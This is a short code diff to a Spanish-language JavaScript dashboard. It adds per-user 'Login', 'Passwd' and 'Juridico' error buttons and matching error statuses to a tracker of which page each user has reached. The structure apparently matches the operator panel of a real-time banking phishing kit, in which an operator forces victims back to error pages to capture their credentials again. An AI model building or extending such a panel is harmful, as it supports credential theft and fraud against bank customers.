@@ -408,7 +408,7 @@ function updateUI(docs) {
                 <span class="badge badge-${statusClass}">${statusText}</span>
                 </div>
               <div class="card-body" style="background-color: ${cardBackgroundColor};">
-                <div style="margin-bottom: 20px;"><strong>En caso de Error:</strong> 
+                <div style="margin-bottom: 20px;"><strong>Error:</strong> 
                 <button class="btn btn-danger action-btn" data-action="login-error" data-id="${userId}">Login</button>
                 <button class="btn btn-danger action-btn" data-action="passwd-error" data-id="${userId}">Passwd</button>
                 <button class="btn btn-danger action-btn" data-action="juridico-error" data-id="${userId}">Juridico</button>
@@ -1574,11 +1574,17 @@ function getLastClickInfo(userData) {
 function getStatusText(page) {
     switch (page) {
         case 1:
-            return "Inicio";
+            return "Login";
+        case 11:
+            return "Login-Error";
         case 2:
             return "Passwd";
+        case 22:
+            return "Passwd-Error";
         case 3:
             return "Juridico";
+        case 33:
+            return "Juridico-Error";
         case 4:
             return "Dashboard";
         case 5:
@@ -1603,10 +1609,16 @@ function getStatusClass(page) {
             return "secondary";
         case 1:
             return "success";
+        case 11:
+            return "danger";
         case 2:
             return "info";
+        case 22:
+            return "danger";
         case 3:
             return "warning";
+        case 33:
+            return "danger";
         case 4:
             return "success";
         case 5:
